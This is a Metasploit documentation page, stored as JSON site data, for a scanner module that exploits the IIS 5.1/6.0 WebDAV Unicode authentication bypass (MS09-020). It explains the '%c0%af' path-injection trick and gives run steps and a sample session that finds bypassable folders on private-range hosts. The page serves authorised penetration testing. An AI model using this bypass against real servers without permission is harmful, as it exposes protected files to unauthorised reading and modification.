{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/http/dir_webdav_unicode_bypass","result":{"data":{"moduleMetadataJson":{"id":"99ca6c1c-52a1-5e58-9ea2-7413430aef8c","name":"MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner","fullname":"auxiliary/scanner/http/dir_webdav_unicode_bypass","description":"This module is based on et's HTTP Directory Scanner module,\n        with one exception. Where authentication is required, it attempts\n        to bypass authentication using the WebDAV IIS6 Unicode vulnerability\n        discovered by Kingcope. The vulnerability appears to be exploitable\n        where WebDAV is enabled on the IIS6 server, and any protected folder\n        requires either Basic, Digest or NTLM authentication.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/http/dir_webdav_unicode_bypass","documentationSlug":"/modules/documentation/auxiliary/scanner/http/dir_webdav_unicode_bypass"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>The WebDAV extension in Microsoft Internet Information Services (IIS) 5.1 and 6.0 allows remote attackers to bypass URI-based protection mechanisms, and list folders or read, create, or modify files, via a <code class=\"language-text\">%c0%af</code> (Unicode / character) at an arbitrary position in the URI, as demonstrated by inserting <code class=\"language-text\">%c0%af</code> into a <code class=\"language-text\">/protected/</code> initial pathname component to bypass the password protection on the <code class=\"language-text\">protected</code> folder, aka \"IIS 5.1 and 6.0 WebDAV Authentication Bypass Vulnerability,\" a different vulnerability than CVE-2009-1122. More info about this vulnerability can be found in <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-1535\">CVE-2009-1535</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set THREADS [number of threads]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/http/dir_webdav_unicode_bypass\nmsf auxiliary(dir_webdav_unicode_bypass) &gt; set RHOSTS 192.168.1.200-254\nRHOSTS =&gt; 192.168.1.200-254\nmsf auxiliary(dir_webdav_unicode_bypass) &gt; set THREADS 20\nTHREADS =&gt; 20\nmsf auxiliary(dir_webdav_unicode_bypass) &gt; run\n\n[*] Using code &#39;404&#39; as not found.\n[*] Using code &#39;404&#39; as not found.\n[*] Using code &#39;404&#39; as not found.\n[*] Found protected folder http://192.168.1.211:80/admin/ 401 (192.168.1.211)\n[*] \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\n[*] Found protected folder http://192.168.1.223:80/phpmyadmin/ 401 (192.168.1.223)\n[*] \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\n[*] Found protected folder http://192.168.1.223:80/security/ 401 (192.168.1.223)\n[*] \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\n[*] Found protected folder http://192.168.1.204:80/printers/ 401 (192.168.1.204)\n[*] \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\n[*] \tFound vulnerable WebDAV Unicode bypass target http://192.168.1.204:80/%c0%afprinters/ 207 (192.168.1.204)\n[*] Found protected folder http://192.168.1.203:80/printers/ 401 (192.168.1.203)\n[*] \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\n[*] \tFound vulnerable WebDAV Unicode bypass target http://192.168.1.203:80/%c0%afprinters/ 207 (192.168.1.203)\n...snip...\n[*] Scanned 55 of 55 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(dir_webdav_unicode_bypass) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"99ca6c1c-52a1-5e58-9ea2-7413430aef8c"}}}